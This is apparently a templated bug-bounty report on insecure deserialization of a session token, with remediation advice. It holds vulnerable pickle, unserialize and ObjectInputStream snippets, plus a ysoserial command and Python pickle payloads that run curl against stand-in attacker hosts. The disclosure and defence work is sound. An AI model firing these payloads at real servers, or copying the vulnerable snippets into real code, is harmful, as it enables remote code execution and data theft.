# 🐞 Insecure Deserialization Vulnerability Report

---

## 📌 Title

**Insecure Deserialization in Session Token Handling Leads to Remote Code Execution (RCE)**

---

## 📝 Description

An **Insecure Deserialization** vulnerability was identified in the application’s handling of serialized objects. The backend accepts untrusted data and deserializes it without verifying the data source or integrity, enabling attackers to craft malicious objects that result in remote code execution or logic manipulation.

Insecure deserialization is often used to exploit:

- **Remote Code Execution (RCE)**
- **Authentication Bypass**
- **Privilege Escalation**
- **Denial of Service (DoS)**

---

## 🌐 Affected Endpoint

- **URL**: `https://vulnerable-website.com/api/auth/session`
- **Method**: `POST`
- **Vulnerable Parameter**: `session_token` (Base64 encoded serialized data)

---

## ⚙️ Vulnerable Code Snippet (Python / PHP / Java Example)

```python
# ❌ Python example
import pickle
def load_session(token):
    return pickle.loads(base64.b64decode(token))  # Vulnerable
```

```php
// ❌ PHP example
$session = unserialize(base64_decode($_POST['session_token']));
```

```java
// ❌ Java example
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // No validation
```

---

## 🧪 Steps to Reproduce

### ✅ Prerequisites

- Any intercepting proxy (Burp Suite, Postman, etc.)
- Ability to send custom session tokens
- Optional: use tools like `ysoserial`, `marshalsec`, or `pickletools`

---

### 🔁 Step-by-Step

#### Step 1: Capture Valid Request

```http
POST /api/auth/session HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{
  "session_token": "gASV...=="  // base64 encoded serialized object
}
```

#### Step 2: Craft Malicious Payload

Using `ysoserial` for Java (example):

```bash
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com' > payload.ser
```

Or Python:

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
```

#### Step 3: Replace Token

```json
{
  "session_token": "<malicious_base64_payload>"
}
```

#### Step 4: Send Request

✅ The server executes the command or performs unauthorized actions.

---

## 💣 Proof of Concept (PoC)

**Python RCE PoC Payload**

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("curl http://yourhost.com/ping",))

print(base64.b64encode(pickle.dumps(RCE())))
```

Send the payload via:

```http
POST /api/auth/session
{
  "session_token": "gASVNwAAAAAAAACMCnN5c3RlbQpzCnN5c3RlbQp..."  // shortened
}
```

---

## 🔥 Impact

- **Remote Code Execution (RCE)**
- **Authentication/Session Hijacking**
- **Privilege Escalation**
- **Logic Tampering**
- **Data Exfiltration**
- **Denial of Service (DoS)**

---

## 🔧 Recommended Remediation

- ❌ Do **not** deserialize user input
- ✅ Use **signed** and **encrypted** tokens (JWT, etc.)
- ✅ Use safe serialization formats: JSON, XML with schema validation
- ✅ Use allow-lists for class deserialization in Java

### Secure Alternatives:

- Replace `pickle`, `unserialize`, `ObjectInputStream` with safer libraries
- In Java: Use `Kryo`, `Jackson` (with type restrictions)
- In Python: Use `json.loads()` instead of `pickle`

---

## 🔐 Security Best Practices

- Never trust client-supplied data for deserialization
- Use integrity checks (HMAC, digital signature)
- Implement logging for all deserialization errors
- Use deserialization sandboxing (Java SecurityManager or containers)

---

## 🧾 References

- [OWASP - Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [PortSwigger - Deserialization Exploits](https://portswigger.net/web-security/deserialization)
- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Burp Suite, Python, ysoserial  
- **Severity**: **Critical**

---

> ⚠️ This issue is reported responsibly. Please verify the finding. Bug bounty reward appreciated if valid.
